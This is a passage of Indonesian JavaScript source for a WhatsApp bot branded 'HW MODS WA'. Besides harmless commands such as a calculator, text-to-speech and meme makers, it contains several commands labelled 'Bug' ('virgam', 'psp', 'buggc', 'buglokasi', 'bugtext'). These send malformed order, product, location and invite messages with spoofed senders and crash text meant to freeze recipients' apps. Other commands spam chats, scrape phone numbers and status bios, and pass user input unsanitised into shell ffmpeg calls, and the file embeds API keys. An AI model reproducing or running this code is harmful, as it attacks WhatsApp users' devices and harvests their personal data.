							Haikal.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
// Nulis By Haikal
case 'nulis1':  
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} nama & kelas & nulis*`)
                    var F = body.slice(8)
			        var F1 = F.split("&")[0];
			        var F2 = F.split("&")[1]; 
			 	   var F3 = F.split("&")[2]; 
                    freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?nama=${F1}&kelas=${F2}&text=${F3}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `Nih Kak`, quoted: mek})
                    break
case 'nulis2':  
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)                    
                    var F = body.slice(8)         
			                    freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${F}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: mek}) 
                    break 
                    case 'nulis3':  
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`) 
                    var F = body.slice(8)          
    			                        freply(' ```kintil``` ')
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis6?text=${F}&APIKEY=${xteam}`)
                    Haikal.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: mek}) 
                    break                
case 'darkjokes':
data = fs.readFileSync('./lib/darkjokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
Haikal.sendMessage(from, hasil, image, {quoted: mek})
break
//Bug Kosong
case 'hw1':    
					if (!isGroup) return reply(mess.only.group)
					bego = fs.readFileSync(`./stik/deden.jpeg`)
                teks = args.join(' ')
                bego = body.slice(11)
                options = {
                sendEphemeral: true, 
               thumbnail: fs.readFileSync('./stik/deden.jpeg')
                }
              await Haikal.sendMessage(from, bego, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
               break
// Bug Catalog ( HW MODS WA )
case 'pcp':
if (!mek.key.fromMe && !isOwner) return
buf = fs.readFileSync('./stik/bacotah.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Haikal.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"title": `HW MODS WA ${virtex}`,
"description": `${vipi}`,
"thumbnail": fs.readFileSync('./stik/deden.jpeg'),
"currencyCode": "IDR",
"priceAmount1000": "-99999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}}) 
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
Haikal.relayWAMessage(res)
break
case 'virgam':            
buf = fs.readFileSync('./stik/anjay.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fekemek) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                                                        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": false
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'virgam1':            
buf = fs.readFileSync('./stik/fake.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fekemek) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'virgam2':            
buf = fs.readFileSync('./stik/deden.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fekemek) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'virgam3':            
buf = fs.readFileSync('./stik/bacotah.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fekemek) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'assalamualaikum':
	const Haikal5 = fs.readFileSync('./stik/deden.jpeg')
Haikal.sendMessage(from,Haikal5,image,{mimetype: Mimetype.fekemek,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'pp':
	const Haikal6 = fs.readFileSync('./stik/anjay2.jpeg')
Haikal.sendMessage(from,Haikal6,image,{mimetype: Mimetype.fekemek,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'bang':
	const Haikal7 = fs.readFileSync('./stik/anjay.jpeg')
Haikal.sendMessage(from,Haikal7,image,{mimetype: Mimetype.fekemek,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'alah':
	const Haikal8 = fs.readFileSync('./stik/anjir.jpeg')
Haikal.sendMessage(from,Haikal8,image,{mimetype: Mimetype.fekemek,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'kal':
	const Haikal4 = fs.readFileSync('./stik/bacotah.jpeg')
Haikal.sendMessage(from,Haikal4,image,{mimetype: Mimetype.fekemek,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break
// Kalkulator ( HW MODS WA )
case 'kalkulator':
if (args.length < 1) return reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
reply('Error')
} else {
reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
break
case 'fox':  
                   anu = await fetchJson(`https://some-random-api.ml/img/fox`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break                   
                   case 'cat':  
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break                                      
                   case 'bird':  
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'koala':  
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'meme':  
                   anu = await fetchJson(`https://some-random-api.ml/meme`)
                   anu1 = await getBuffer(anu.image)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak`, quoted: mek})
                   break
case 'smeme':
pe = args.join('')
            top = pe.split('|')[0]
            bottom = pe.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  Haikal.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break
// Set Prefix ( HW MODS WA )
case 'setprefix':
if (args.length < 1) return freply(`Example:\n•> ${prefix}setprefix multi\n•> ${prefix}setprefix <query>`)
if (args[0] === 'multi') {
if (multi === true) return
multi = true
freply(`\`\`\`Succes change prefix =「 Multi Prefix 」\`\`\``)
} else {
multi = false
pref = args[0]
freply(`\`\`\`Succes change prefix =「 ${args[0]} 」\`\`\``)
}
break
// Colong Nomor Yok
case 'nowa':
                var teks = body.slice(6)
                if (!teks) return reply("lah?")
                var numberPattern = /\d+/g;
                var nomer = teks.match(numberPattern)
                var random_length = teks.length - nomer[0].length;
                if (random_length == 1) {
                    var random = 10
                } else if (random_length == 2) {
                    var random = 100
                } else if (random_length == 3) {
                    var random = 1000
                } else if (random_length == 4) {
                    var random = 10000
                }
                console.log(random)
                var nomerny = `List Nomer\n`
                for (let i = 0; i < random; i++) {
                    var nu = ['1','2','3','4','5','6','7','8','9']
                    var dom1 = nu[Math.floor(Math.random() * nu.length)]
                    var dom2 = nu[Math.floor(Math.random() * nu.length)]
                    var dom3 = nu[Math.floor(Math.random() * nu.length)]
                    var dom4 = nu[Math.floor(Math.random() * nu.length)]
                    if (random_length == 1) {
                        var rndm = `${dom1}`
                        var gdaftar = []
                    } else if (random_length == 2) {
                        rndm = `${dom1}${dom2}`
                    } else if (random_length == 3) {
                        rndm = `${dom1}${dom2}${dom3}`
                    } else if (random_length == 4) {
                        rndm = `${dom1}${dom2}${dom3}${dom4}`
                    }
                    var anu = await Haikal.isOnWhatsApp(`${nomer[0]}${i}@s.whatsapp.net`);
                    var bionye = await Haikal.getStatus(`${nomer[0]}${i}@s.whatsapp.net`);
                    var anuu = anu ? anu : false;
                    try {
                        if (nomerny.includes(anu.jid.split("@")[0])) {
                            //console.log(i)
                        } else {
                            nomerny += `NO: wa.me/${anu.jid.split("@")[0]}\nBIO: ${bionye.status}\n\n`
                        }
                    } catch {
                        console.log(i)
                    }
                }
                reply(nomerny)
                console.log("Done dump")
				break
// Voice Google 
case 'tts':
					if (args.length < 1) return Haikal.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return Haikal.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								Haikal.sendMessage(from, buff, audio, { duration: 999999999, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
// kick Anggota group
case 'kick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *ASEK DAPAT JATAH KICK*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						Haikal.groupRemove(from, mentioned)
					} else {
						mentions(`╭────────────────⊱
║> *ASEK DAPAT JATAH KICK*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						Haikal.groupRemove(from, mentioned)
					}
					break
// Bug Invite Group ( HW MODS WA )
case 'hay':
if (!mek.key.fromMe) return 
res = await Haikal.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "34699303450-1355008702@g.us",
"inviteCode": "BqtzrhqPxvFG2Kg2k1jaUi",
"inviteExpiration": "162533333338378",
"groupName": `HW MODS WA${vipi}`,
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAwQCBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAAD55qqzfkzyvce5lk9iHM5oipvuDUWq744x2uXK9IcizwS98dWekvY4fSi/kdPjVHTHYkx6OM1TVDlmGGtIf5Urd4qQ0OMaC0xgZ7Z2ErWDzyA8/wD/xAAlEAACAgICAQQCAwAAAAAAAAABAgARAxIhMQQQEyJBBVEyYXH/2gAIAQEAAT8AiJGIQTclo2AFNxMQs6sJlx0JrYjCopBMxFZkUk31HTCFB2sxfI0WhA4PO3M23xm4RSiPEQfqZWGHHYHJiszNETdyonstfHUyKBUwt3Z4Ahyq/HUeognlglFM8FF5cnqY/GwM5yJM+AdqvJnk49AOOZjXZpqnVczIFHAMQwKGUg9TD8M7J9GIpC/EAQgMKufkV10ifyEetbHomVR9zHkUjueQQM26GeN5Yyrq4owFMYsGec5yZJ0YoAWzMhBYkQAsIuN1oWI4LaCgLgVxdAfGXlI74hVj8j1FQmiR0ajK1VCNSRENAxcgDcwsCyfoT3e/6iuK0sfKzA9AD6qpsBV9XcbIDtHINf56AxDLBEWrhaF7hPp//8QAFhEBAQEAAAAAAAAAAAAAAAAAITAQ/9oACAECAQE/AMYN/wD/xAAdEQACAQUBAQAAAAAAAAAAAAAAAQIQERIhQTFh/9oACAEDAQE/APRoeOh2T1Tld2GIT5Y3b4RrlJGUmO8XREXo4NsZ/9k=",
"caption": "https://chat.whatsapp.com/BqtzrhqPxvFG2Kg2k1jaUi",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}})
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
Haikal.relayWAMessage(res)
await setTimeout(() => {
freply('Limit-anda-sudah-habis-....!!! Pulsa anda tidak mencukupi untuk melakukan WhatsApp kepada Haikal .. !!! Terimakasih..')
}, 3000)
break
case "buggc":
        if (!mek.key.fromMe) return 
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        reply(`Sukses Mengirim Bug Di ${groupName}`);
        break
// Bug Lokasi
case 'buglokasi':
if (!mek.key.fromMe) return 
buffer = fs.readFileSync(`./stik/hwmods.png`)
Haikal.sendMessage(from, { "degreesLatitude": 24.121231,
            "degreesLongitude": 55.1121221,
            "name": `HW MODS WA${vipi,virtex}`,
            "currencyCode": "USD",
"priceAmount1000": "-9999999999,",
            "address": emoji2(prefix),
                        jpegThumbnail: fekemek },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: -999999999999, // Bug
    status: 1,
    surface: 1,
    message: `HW MODS WA${vipi,virtex}`,
    orderTitle: `HW MODS WA`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
// Bug virtext
case 'bugtext':
if (!mek.key.fromMe) return 
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Haikal.sendMessage(from, `HW MODS WA${vipi,virtex}`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: -999999999999, // Bug
    status: 1,
    surface: 1,
    message: `HW MODS WA${virtex}`,
    orderTitle: `HW MODS WA${virtex}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
}}}}, 0)
}
break
// Bug Trolli ( HW MODS WA )
case 'psp': // BUG TROLLI + BUG GC + TROLLI
buf = fs.readFileSync('./stik/bacotah.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fekemek) 
imeg = imeu.message.imageMessage
res = await Haikal.prepareMessageFromContent(from,{
"orderMessage": {
"jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
"itemCount": -999999999999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": `HW MODS WA${vipi}`,
"message": `HW MODS WA${virtex}`,
"sellerJid": "0@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "-999999999999",
"totalCurrencyCode": "-999999999999",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}}) 
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
Haikal.relayWAMessage(res)
break
// Bug Dokumen
case 'pvp':
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
tapib1 = fs.readFileSync('./stik/numayei.mp3')
Haikal.sendMessage(from, tapib1, document, { quoted: mek, filename:`HW MODS WA${vipi}.mp3`, mimetype: 'audio/application' })
await freply('Musik Yok')
break
// Anti Delete ( HW MODS WA )
case 'antidelete':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return freply('Pilih on atau off')
if (args[0] === "on") {
if (antidel === true) return
antidel = true
freply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
freply(`Succes mematikan antidelete`)
} else {
freply(`Pilih on atau off`)
}
break
// Anti Call ( HW MODS WA )
case 'anticall':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return freply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return
antical = true
freply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if (antical === false) return
antical = false
freply(`Succes mematikan anticall`)
} else {
freply(`Pilih on atau off`)
}
break
// Auto Read ( HW MODS WA )
case 'autoread':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readG === true) return
readG = true
freply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
freply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readP === true) return
readP = true
freply(`Succes mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
freply(`Succes mematikan autoread pribadi`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
// Fake Size ( HW MODS WA )
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await Haikal.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
Haikal.relayWAMessage(costick)
break
// Spam Chat ( HW MODS WA )
case 'spam':
if (!isOwner && !mek.key.fromMe) return
if (!m.quoted) return reply(`reply pesanya`)
if (args.length < 1) return reply(`Example :\n${prefix}spam 15`)
if (args[0] > 100) return reply(`Maximal 100`)
let jml = args[0]
for(let i=0;i<jml;i++){
m.quoted.copyNForward(m.chat, true)
}
break
// Set Cmd ( HW MODS WA & Rashid )
case 'addcmd': 
case 'setcmd':
if (isQuotedSticker) {
if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
freply("Done Bwang")
} else {
reply('tag stickenya')
}
break
// Del Cmd ( HW MODS WA & Rashid )
case 'delcmd':
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
freply("Done Bwang")
break
// List Cmd ( HW MODS WA & Rashid )
case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
freply(teksnyee)
break
// Stop Jadibot ( HW MODS WA & Vean & HAIKALz )
case 'stopbot':
stopjadibot(Haikal, from, sender, mek)
break
// Jadibot ( HW MODS WA & Vean & HAIKALz )
case 'jadibot':
if (!isOwner) return reply(`_Silahkan Hubungi Owner Untuk Memakai Fitur Ini_`)
jadibot(Haikal, from, sender, reply, mek)
break
// Antitag On / Off ( HW MODS WA )
case 'antitag':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (antitags === true) return
antitags = true
freply(`Berhasil mengaktifkan antitag!`)
} else if (args[0] === 'off') {
if (antitags === false) return
antitags = false
freply(`Berhasil menonaktifkan antitag!`)
} else {
reply('Pilih on atau off')
}
break
// Volume Audio ( HW MODS WA )
case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Haikal.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
Haikal.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(rname)
})
break
// Ngebalik Huruf ( HW MODS WA )
case 'fliptext':
if (args.length < 1) return reply(`Example:\n${prefix}fliptext HAIKAL`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
break
// Angka To Huruf ( HW MODS WA )
case 'tohuruf':
if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await toHur(quere)
reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
reply(mess.error.api)
}
